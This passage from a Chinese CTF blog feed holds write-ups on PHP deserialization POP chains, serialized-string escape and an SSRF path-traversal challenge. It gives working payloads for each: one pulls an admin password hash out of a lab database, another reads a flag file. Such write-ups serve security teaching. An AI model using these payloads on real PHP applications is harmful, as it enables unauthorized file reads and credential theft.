class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbpass=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $database=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> $name;<br>    <span class="hljs-keyword">public</span> $password;<br>    <span class="hljs-keyword">public</span> $mysqli;<br>    <span class="hljs-keyword">public</span> $token;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=$_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-keyword">$this</span>-&gt;password=$_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-keyword">$this</span>-&gt;token=$_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$sql</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;hostname, <span class="hljs-keyword">$this</span>-&gt;dbuser, <span class="hljs-keyword">$this</span>-&gt;dbpass, <span class="hljs-keyword">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        $result=<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);<br>        $result-&gt;bind_param(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;name);<br>        $result-&gt;execute();<br>        $result-&gt;bind_result($idResult, $passwordResult);<br>        $result-&gt;fetch();<br>        $result-&gt;close();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> $idResult;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!$idResult) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-keyword">$this</span>-&gt;password)!==$passwordResult) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> $idResult;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$sql</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//还没来得及写</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">UpdateHelper</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $id;<br>    <span class="hljs-keyword">public</span> $newinfo;<br>    <span class="hljs-keyword">public</span> $sql;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo,$sql</span>)</span>&#123;<br>        $newInfo=unserialize($newInfo);<br>        $upDate=<span class="hljs-keyword">new</span> dbCtrl();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//这里如果sql为类的话就会调用user的__string()函数</span><br></code></pre></td></tr></table></figure><blockquote><p>pop 链思路 ：利用 UpdateHelper类的__destruct函数触发User类的__tostring函数再触发Info类的__call()函数</p><p>把 $this-&gt;CtrlCase实例化dbctrl 对象，再调用dbctrl类的login函数，通过查询语句把admin账户的密码查出来</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//payload</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $id;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> $nickname = <span class="hljs-literal">null</span>;    <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $age;<br>    <span class="hljs-keyword">public</span> $nickname;<br>    <span class="hljs-keyword">public</span> $CtrlCase;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age,$nickname</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;age = $age;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = $nickname;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $id;<br>    <span class="hljs-keyword">public</span> $newinfo;<br>    <span class="hljs-keyword">public</span> $sql;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo,$sql</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $newInfo = unserialize($newInfo);<br>        $upDate = <span class="hljs-keyword">new</span> dbCtrl();        <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $hostname=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbuser=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbpass=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $database=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> $password;<br>    <span class="hljs-keyword">public</span> $mysqli;<br>    <span class="hljs-keyword">public</span> $token = <span class="hljs-string">&quot;admin&quot;</span>;    <br>&#125;<br>$db = <span class="hljs-keyword">new</span> dbCtrl();<br>$user = <span class="hljs-keyword">new</span> User();<br>$info = <span class="hljs-keyword">new</span> Info(<span class="hljs-string">&quot;lcdm123&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>$updatehelper = <span class="hljs-keyword">new</span> UpdateHelper(<span class="hljs-string">&quot;lcdm123&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>$info-&gt;CtrlCase = $db;<br>$user-&gt;nickname = $info;<br>$user-&gt;age = <span class="hljs-string">&quot;select password,id from user where username=?&quot;</span>;<br>$updatehelper-&gt;sql = $user;<br><br>$realinfo = <span class="hljs-keyword">new</span> Info(<span class="hljs-string">&quot;lcdm123&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>$realinfo-&gt;CtrlCase = $updatehelper;<br><span class="hljs-keyword">echo</span> serialize($realinfo);<br><br><span class="hljs-comment">//O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/19/N5rC6EoHx9bgWtO.png" alt="image-20201219174513688"></p><p><img src="https://i.loli.net/2020/12/19/zlhwvqRcAB9p2xX.png" alt="image-20201219175110353"></p><p>最终payload</p><p><a href="http://lcdm123.top/2020/11/30/Unctf-WEB/">序列化逃逸</a></p><blockquote><p>这样构造的原因：将之前的序列化字符串删除info的部分（因为传入参数时会自动构造info），添加（”;s:8:”CtrlCase”;）的原因是因为传入参数的时候没有CtrlCase参数，需要自己提前构造好利用php反序列化字符串逃逸的方法传入</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;unionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>传入payload，获取到密码的payload（需要手动删除后面的0-0）</p><p><img src="https://i.loli.net/2020/12/19/PphKnBU5Oof7NzD.png" alt="image-20201219181053512"></p><p>获得密码</p><p><img src="https://i.loli.net/2020/12/19/YhBUPJtlczQ8ewE.png" alt="image-20201219160536309"></p><p>登录获取flag</p><p><img src="https://i.loli.net/2020/12/19/PbarExg3MjSnufL.png" alt="image-20201219160523133"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;考点：php序列化pop链   序列化字符串逃逸&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;打开题目按照管理先扫描目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;使用dirsearch 扫描出来了  flag.php  login.php&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化POP链构造</title>
    <link href="http://example.com/2020/12/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://example.com/2020/12/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-12-21T15:20:59.000Z</published>
    <updated>2020-12-22T11:45:14.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="构造PHP反序列化pop链"><a href="#构造PHP反序列化pop链" class="headerlink" title="构造PHP反序列化pop链"></a>构造PHP反序列化pop链</h2><blockquote><p>以前理解的序列化攻击更多是在魔术方法中出现的一些利用漏洞，因为自动调用从而触发的漏洞。**<em>但是如果关键代码不在魔术方法中**</em>，而在一个类的普通方法中，这时候需要找相同的函数名将类的属性与敏感函数的属性联系起来</p></blockquote><a id="more"></a><h3 id="常见的php魔法函数"><a href="#常见的php魔法函数" class="headerlink" title="常见的php魔法函数"></a>常见的php魔法函数</h3><blockquote><p> 构造pop链的关键</p></blockquote><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__construct</span>()  当一个对象创建时被调用</span><br><span class="hljs-function"><span class="hljs-title">__destruct</span>()   当一个对象被销毁时调用</span><br><span class="hljs-function"><span class="hljs-title">__weakup</span>()     使用<span class="hljs-variable">unserialize</span>时触发</span><br><span class="hljs-function"><span class="hljs-title">__sleep</span>()      使用<span class="hljs-variable">serialize</span>时触发</span><br><span class="hljs-function"><span class="hljs-title">__call</span>()       在对象上下文中调用不可访问的方法时触发</span><br><span class="hljs-function"><span class="hljs-title">__get</span>()        从不可访问的属性读取数据</span><br><span class="hljs-function"><span class="hljs-title">__set</span>()        将数据写入不可访问的属性</span><br><span class="hljs-function"><span class="hljs-title">__toString</span>()   把类当成字符串使用时触发</span><br><span class="hljs-function"><span class="hljs-title">__invoke</span>()     当脚本尝试将对象调用为函数时触发</span><br></code></pre></td></tr></table></figure><p><strong><em>构造pop链，首先要找到头和尾（用户传入参数的地方与最终要执行函数的地方），从头到尾进行反推</em></strong></p><h3 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test1</span></span>&#123;<br>    pubilc $a;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-keyword">new</span> test2;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;a))<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;a-&gt;action();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello world!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test3</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $cmd<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br>unserialize($_GET[<span class="hljs-string">&#x27;d&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这是一个简单的例子，通过test::__string() –&gt; test3::__action() 来构造pop链</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 构造pop链</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $a;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-keyword">new</span> test3; <br>    &#125;<br>    <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test3</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $cmd = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br>$b = <span class="hljs-keyword">new</span> test1;<br><span class="hljs-keyword">echo</span> serialize($b);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>对于protect 与 private 序列化后 需要添加 %00</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;构造PHP反序列化pop链&quot;&gt;&lt;a href=&quot;#构造PHP反序列化pop链&quot; class=&quot;headerlink&quot; title=&quot;构造PHP反序列化pop链&quot;&gt;&lt;/a&gt;构造PHP反序列化pop链&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;以前理解的序列化攻击更多是在魔术方法中出现的一些利用漏洞，因为自动调用从而触发的漏洞。**&lt;em&gt;但是如果关键代码不在魔术方法中**&lt;/em&gt;，而在一个类的普通方法中，这时候需要找相同的函数名将类的属性与敏感函数的属性联系起来&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Unctf-WEB</title>
    <link href="http://example.com/2020/11/30/Unctf-WEB/"/>
    <id>http://example.com/2020/11/30/Unctf-WEB/</id>
    <published>2020-11-30T14:03:36.000Z</published>
    <updated>2020-12-22T11:42:43.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>[TOC]</p><a id="more"></a><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/unctf\.com/&#x27;</span>,$url))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,$url))&#123;<br>        $url=file_get_contents($url);<br>        <span class="hljs-keyword">echo</span>($url);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>SSRF   返回上级目录，读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload:?url=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/07/GZqdMIHzobl61PX.png" alt="image-20201107151749234"></p><h3 id="easyunserializ"><a href="#easyunserializ" class="headerlink" title="easyunserializ"></a>easyunserializ</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $uname;<br>    <span class="hljs-keyword">public</span> $password;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$password</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname=$uname;<br>        <span class="hljs-keyword">$this</span>-&gt;password=$password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                <span class="hljs-keyword">echo</span> $flag;    <br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;wrong password&#x27;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,$string);<br>&#125; <span class="hljs-comment"># 改变序列化中的字符</span><br><br>$uname=$_GET[<span class="hljs-number">1</span>];<br>$password=<span class="hljs-number">1</span>;<br>$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));<br>$test=unserialize($ser);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="php反序列化字符串逃逸"><a href="#php反序列化字符串逃逸" class="headerlink" title="php反序列化字符串逃逸"></a>php反序列化字符串逃逸</h5><ul><li>序列化的特点：以 ; 为字段的分隔，以 } 为结尾，并且根据长度判断内容</li><li>超出部分不会被反序列化成功，说明反序列化的过程是有一定的识别范围的，范围之外都会被自动忽略</li><li>反序列化时长度不对应会报错</li><li>可以反序列化不存在的元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 过滤后字符增加时</span><br><span 